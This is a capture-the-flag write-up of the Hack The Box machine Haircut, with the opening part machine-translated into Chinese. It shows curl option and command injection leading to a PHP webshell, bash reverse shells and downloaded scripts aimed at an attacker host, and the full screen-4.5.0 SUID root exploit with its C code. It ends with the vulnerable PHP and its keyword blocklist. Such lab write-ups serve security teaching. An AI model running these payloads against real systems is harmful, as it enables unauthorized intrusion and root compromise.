# 断续器：理发

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/09/10/htb-haircut.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fhaircut-cover.) 

理发从一些网络枚举开始，在那里我会找到一个调用curl的PHP站点。我将使用参数注入将 webshell 写入服务器并执行。我还将枚举筛选器，并找到一种在页面本身中获取命令执行的方法。要跳转到根目录，我将确定设置了SUID的易受攻击的屏幕版本（这是正常的）。我将演练此漏洞。在“超越根”中，我将快速浏览一下 PHP 页面中的过滤。

## 箱子信息

名字

[理发](https://www.hackthebox.eu/home/machines/profile/21) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-haircut.png) 

发行日期

26 五月 2017

停用日期

10 9月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fhaircut-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fhaircut-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 16分16秒[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F450)](https://www.hackthebox.eu/home/users/profile/450)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 13分 30秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F1023)](https://www.hackthebox.eu/home/users/profile/1023)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F462)](https://www.hackthebox.eu/home/users/profile/462)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.24
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 15:51 EDT
    Nmap scan report for 10.10.10.24
    Host is up (0.017s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
    
    root@kali# nmap -sC -sV -p 22,80 -oA scans/nmap-tcpscripts 10.10.10.24
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 15:51 EDT
    Nmap scan report for 10.10.10.24
    Host is up (0.015s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
    |   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
    |_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
    80/tcp open  http    nginx 1.10.0 (Ubuntu)
    |_http-server-header: nginx/1.10.0 (Ubuntu)
    |_http-title:  HTB Hairdresser 
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
    

基于 [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) 版本，主机可能运行的是 Ubuntu 16.04 炔诺版。

### 网站 - TCP 80

#### 网站

该网站只有一个女人的大图像：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200903155703056.png) 

HTML确认这就是这里的全部内容：

    root@kali# curl http://10.10.10.24
    <!DOCTYPE html>
    
    <title> HTB Hairdresser </title>
    
    <center> <br><br><br><br>
    <img src="bounce.jpg" height="750" width="1200" alt="" />
    <center>
    

#### 目录暴力破解

我将针对站点运行，并包括，因为这些类型的主机经常运行PHP（特别是在较旧的框中）：`gobuster``-x php`

    root@kali# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php -o scans/go
    buster-root-med-php
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.24
    [+] Threads:        40
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php
    [+] Timeout:        10s
    ===============================================================
    2020/09/03 19:55:45 Starting gobuster
    ===============================================================
    /uploads (Status: 301)
    /exposed.php (Status: 200)
    ===============================================================
    2020/09/03 19:59:20 Finished
    ===============================================================
    

Those are both potentially interesting. Visiting just returns a 403 forbidden.`/uploads`

#### /exposed.php

This site has a place to enter a URL and a Go button:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200903160113525.png) 

If I submit the example URL, it returns stats about retrieving the page and what looks like a page:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200903160152560.png) 

I’ll check ,and it is the same page that is displayed here.`http://10.10.10.24/test.html`

Can it check pages on my host? I started a Python webserver and then entered into the bar and hit submit:`http://10.10.14.15/test.html`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200903160340485.png) 

The webserver shows the request and that it returned 404:

    root@kali# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.24 - - [03/Sep/2020 20:02:41] code 404, message File not found
    10.10.10.24 - - [03/Sep/2020 20:02:41] "GET /test.html HTTP/1.1" 404 -
    

I tried a simple PHP script to see if the server would include the PHP and run it:

    root@kali# echo '<?php echo "test\n"; ?>' > test.php
    

When I submitted this page into the form, I didn’t see on the result. In the source, it was there:`test`

    <html>
    	<head>
    		<title>Hairdresser checker</title>
    	</head>
    	<body>
    	<form action='exposed.php' method='POST'>
    		<span>
    		<p>
    		Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
    		</p>
    		</span>
    		<input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
    		<input type='submit' name='submit' value='Go' id='submit' />
    	</form>
    	<span>
    		<p>Requesting Site...</p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    
      0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
    100    24  100    24    0     0    815      0 --:--:-- --:--:-- --:--:--   827
    <?php echo "test\n"; ?>
    	</span>
    	</body>
    </html>
    

So the page is not running input collected via this method.

## Shell as www-data

### Identify Vulnerability

Looking back at the status messages being output to the screen, it reminded me of what prints when it’s output is piped to another process. For example, in this case I’ll just pipe to (effectively doing nothing) to see the output:`curl``tee /dev/null`

    root@kali# curl 10.10.10.24 | tee /dev/null
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100   144  100   144    0     0   5333      0 --:--:-- --:--:-- --:--:--  5333
    <!DOCTYPE html>
    
    <title> HTB Hairdresser </title>
    
    <center> <br><br><br><br>
    <img src="bounce.jpg"   alt="" />
    <center>
    

My best guess at this point is that the PHP is doing something like:

    if post
        system('curl ' . $POST["formurl"] . ' /path/to/some/directory')
    end if
    

Depending on what level of filtering is going on (if any), that could be vulnerable to a command injection and/or parameter injection attacks.

### Filter Enumeration

The first thing I tried was to fetch . The return shows that there’s some level of filtering going on:`http://10.10.14.15/test.php; ping -c 1 10.10.14.15;`

    	<span>
    		<p>Requesting Site...</p>; is not a good thing to put in a URL	</span>
    

I found a handful of other characters that seem to set off the filter: .`&|!#%[]{}`

### Option Injection

If I’m going to have trouble running a different command, could I at least mess with by injecting options. If I send , I can watch on to see if the cookie is included in the request. It is:`curl``http://10.10.14.15/test.php -b testcookie=testvalue``nc`

    root@kali# nc -lknvp 80
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::80
    Ncat: Listening on 0.0.0.0:80
    Ncat: Connection from 10.10.10.24.
    Ncat: Connection from 10.10.10.24:48118.
    GET /test.php HTTP/1.1
    Host: 10.10.14.15
    User-Agent: curl/7.47.0
    Accept: */*
    Cookie: test=test
    

I was successfully able to injection a option.`curl`

### Upload Webshell

Instead of a cookie, I’ll use to save the file on Haircut. I can save it into the directory and see if it will run as PHP there. When I submit , I only see the status come back:`-o``uploads``http://10.10.14.15/cmd.php -o uploads/0xdf.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200903165427061.png) 

When I check for my shell, it’s there:

    root@kali# curl http://10.10.10.24/uploads/0xdf.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

### Shell

To go to a real shell, I’ll start and send that command to the webshell:`nc`

    root@kali# curl -G http://10.10.10.24/uploads/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'"
    

At a listener:`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.24.
    Ncat: Connection from 10.10.10.24:43828.
    bash: cannot set terminal process group (1225): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@haircut:~/html/uploads$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

### Alternative Injection

I noticed the none of were triggering the filter, so I went for command injection that way as well. The command throws errors onto the page:`` `$()```curl`

    root@kali# curl http://10.10.10.24/exposed.php -d 'formurl=10.10.14.15/$(ping -c 1 10.10.14.15)&submit=go'
    <html>
            <head>
                    <title>Hairdresser checker</title>
            </head>
            <body>
            <form action='exposed.php' method='POST'>
                    <span>
                    <p>
                    Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
                    </p>
                    </span>
                    <input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
                    <input type='submit' name='submit' value='Go' id='submit' />
            </form>
            <span>
                    <p>Requesting Site...</p>curl: option ---: is unknown
    curl: try 'curl --help' or 'curl --manual' for more information
            </span>
            </body>
    </html>
    

But at I get pings:`tcpdump`

    root@kali# tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    21:04:58.132878 IP 10.10.10.24 > 10.10.14.15: ICMP echo request, id 2117, seq 1, length 64
    21:04:58.132924 IP 10.10.14.15 > 10.10.10.24: ICMP echo reply, id 2117, seq 1, length 64
    

Replacing with also worked. All of the reverse shells I typically use contain other filtered characters. But I can use the command injection to upload a shell:`$([command])```` `[command]` ```

    #!/bin/bash
    
    bash -i >& /dev/tcp/10.10.14.15/443 0>&1
    

Now I’ll upload it to Haircut with:

    root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode 'submit=go'
    

That will reach out to my webserver, download to . Now I’ll use the same technique to to make the file executable:`shell.sh``/tmp/0xdf``chmod`

    root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode 'submit=go'
    

And one last time to run it:

    root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(/tmp/rev)' --data-urlencode 'submit=go'
    

At :`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.24.
    Ncat: Connection from 10.10.10.24:43906.
    bash: cannot set terminal process group (1225): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@haircut:~/html$
    

### user.txt

No matter how I get a shell, I can now grab :`user.txt`

    www-data@haircut:/home/maria/Desktop$ cat user.txt
    0b0da2af************************
    

## Shell as root

### Enumeration

In checking for SUID files, I found :`/usr/bin/screen-4.5.0`

    www-data@haircut:~$ find / -perm -4000 -o -perm -2000 -type f 2>/dev/null    
    /bin/ntfs-3g
    /bin/ping6
    /bin/fusermount
    /bin/su
    /bin/mount
    /bin/ping
    /bin/umount
    /sbin/unix_chkpwd
    /sbin/pam_extrausers_chkpwd
    /usr/bin/sudo
    /usr/bin/mlocate
    /usr/bin/pkexec
    /usr/bin/chage
    /usr/bin/screen.old
    /usr/bin/newuidmap
    /usr/bin/crontab
    /usr/bin/bsd-write
    /usr/bin/newgrp
    /usr/bin/newgidmap
    /usr/bin/expiry
    /usr/bin/gpasswd
    /usr/bin/ssh-agent
    /usr/bin/at
    /usr/bin/passwd
    /usr/bin/screen-4.5.0
    /usr/bin/chsh
    /usr/bin/wall
    /usr/bin/chfn
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/lib/x86_64-linux-gnu/utempter/utempter
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/policykit-1/polkit-agent-helper-1
    

This jumped out to me because I ran into this during OSCP. There’s a [vulnerability](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html) in SUID and it happens to be for that version.`screen`

### Exploit Details

In Screen version 4.5.0, if the user specifies a log file, the program will open and append to that log file. Because is typically set to SUID to function, that means write as root.`screen`

There is an [exploit in ExploitDB](https://www.exploit-db.com/exploits/41154) which consists of one long Bash script. I’ll break it into pieces to walk through it (some mods would need to be made anyway).

Most of the exploit is creating and compiling two binary files. First, it creates a shared object / library:

    cat << EOF > /tmp/libhax.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/tmp/rootshell", 0, 0);
        chmod("/tmp/rootshell", 04755);
        unlink("/etc/ld.so.preload");
        printf("[+] done!\n");
    }
    EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
    rm -f /tmp/libhax.c
    

This library has a function that is marked as . [This means](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html#:~:text=The%20constructor%20attribute%20causes%20the,exit%20()%20has%20been%20called) it will run before execution enters main. It is very simple. It just changes the owner of to root:root, then changes the permissions to be SUID, removes the file , and prints a message. This code is compiled into `dropshell``__attribute__ ((__constructor__))``/tmp/rootshell``/etc/ld.so.preload``/tmp/libhax.so`

Next the script creates :`/tmp/rootshell`

    cat << EOF > /tmp/rootshell.c
    #include <stdio.h>
    int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
    }
    EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c
    rm -f /tmp/rootshell.c
    

It simply sets all the user and group ids to root and runs .`/bin/sh`

Now to the exploit. It’ll move into , and then run the following command:`/etc``screen`

    screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
    

The options are as follows:

*   `-D -m` - Start in “detached” mode, but don’t fork a new process, exiting when the session terminates`screen`
*   `-L ld.so.preload` - turn on automatic output logging for the window
*   `echo -ne "\x0a/tmp/libhax.so"` - command to run in the session, printing a newline followed by the path to the malicious library

So this will start screen output the path to the library, which will be logged to the file, and then exit.`/etc/ld.so.preload`

`/etc/ld.so.preload` holds a list of libraries that will attempt to be loaded each time any program is run. So the next time something runs as root, the malicious library will run as root. The script kicks that off by calling screen again:

    screen -ls # screen itself is setuid, so... 
    

Finally, it will call the now SUID .`/tmp/rootshell`

### Run It

I tried to just upload the script to Haircut and run it, but it had some issue compiling things locally. I resorted to compiling locally on my host. I’ll create the two c files on my VM, and then compile them:

    root@kali# gcc -fPIC -shared -ldl -o libhax.so libhax.c 
    libhax.c: In function ‘dropshell’:
    libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
        7 |     chmod("/tmp/rootshell", 04755);
          |     ^~~~~
    root@kali# gcc -o rootshell rootshell.c 
    rootshell.c: In function ‘main’:
    rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
        3 |     setuid(0);
          |     ^~~~~~
    rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
        4 |     setgid(0);
          |     ^~~~~~
    rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
        5 |     seteuid(0);
          |     ^~~~~~~
    rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
        6 |     setegid(0);
          |     ^~~~~~~
    rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
        7 |     execvp("/bin/sh", NULL, NULL);
          |     ^~~~~~
    rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
    

There are some warnings, but both binaries exist:

    root@kali# ls -l libhax.so rootshell
    -rwxrwx--- 1 root vboxsf 16136 Sep  3 22:23 libhax.so
    -rwxrwx--- 1 root vboxsf 16824 Sep  3 22:23 rootshell
    

I’ll upload both of those to on Haircut:`/tmp`

    www-data@haircut:/tmp$ wget 10.10.14.15/libhax.so
    --2020-09-04 04:26:26--  http://10.10.14.15/libhax.so
    Connecting to 10.10.14.15:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 16136 (16K) [application/octet-stream]
    Saving to: 'libhax.so'
    
    libhax.so           100%[===================>]  15.76K  --.-KB/s    in 0.02s   
    
    2020-09-04 04:26:26 (1013 KB/s) - 'libhax.so' saved [16136/16136]
    
    www-data@haircut:/tmp$ wget 10.10.14.15/rootshell
    --2020-09-04 04:26:30--  http://10.10.14.15/rootshell
    Connecting to 10.10.14.15:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 16824 (16K) [application/octet-stream]
    Saving to: 'rootshell'
    
    rootshell           100%[===================>]  16.43K  --.-KB/s    in 0.02s   
    
    2020-09-04 04:26:30 (1.04 MB/s) - 'rootshell' saved [16824/16824]
    

Now to execute, I’ll change into , set the , and run (making sure to get the right one):`/etc``umask``screen`

    www-data@haircut:/tmp$ cd /etc/
    www-data@haircut:/etc$ umask 000
    www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 
    

At this point, should have the reference to (along with some other junk):`ld.so.preload``/tmp/libhax.so`

    www-data@haircut:/etc$ cat ld.so.preload
    ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
    [+] done!
    
    /tmp/libhax.so
    

Now I’ll get root to run something by running :`screen -ls`

    www-data@haircut:/etc$ screen-4.5.0 -ls
    No Sockets found in /tmp/screens/S-www-data.
    

`ld.so.preload` has been cleaned up:

    www-data@haircut:/etc$ ls ld.so.preload
    ls: cannot access 'ld.so.preload': No such file or directory
    

And the is now SUID:`rootshell`

    www-data@haircut:/etc$ ls -l /tmp/rootshell 
    -rwsr-xr-x 1 root root 16824 Sep  4 04:23 /tmp/rootshell
    

I can get a shell as root:

    www-data@haircut:/etc$ /tmp/rootshell 
    # id
    uid=0(root) gid=0(root) groups=0(root),33(www-data)
    

And print :`root.txt`

    root@haircut:/root# cat root.txt
    4cfa26d8************************
    

## Beyond Root

A quick check to see what the filtering actually was in . The entire script was pretty short:`exposed.php`

    <html>
        <head>
        <title>Hairdresser checker</title>
        </head>
        <body>
        <form action='exposed.php' method='POST'>
        <span>
        <p>
        Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
                    </p>
                    </span>
                    <input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
    <input type='submit' name='submit' value='Go' id='submit' />
        </form>
        <span>
        <?php 
        if(isset($_POST['formurl'])){
            echo "<p>Requesting Site...</p>"; 
            $userurl=$_POST['formurl'];
            $naughtyurl=0;
            $disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
            foreach($disallowed as $naughty){
                if(strpos($userurl,$naughty) !==false){
                    echo $naughty.' is not a good thing to put in a URL';
                    $naughtyurl=1;
                }
            }
            if($naughtyurl==0){
                echo shell_exec("curl ".$userurl." 2>&1"); 
            }
        }
    ?>
        </span>
        </body>
        </html>
    

The filtering comes down to not only a handful of characters (all of which I was able to identify), but also a few strings:

    $disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
    

It will loop over these for each request, checking if it is in the user input. If it is found, is set to 1, and then isn’t run.`$naughty``curl`

The looks much like I guessed, only it is using rather than .`curl``echo shell_exec``system`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/09/10/htb-haircut.html)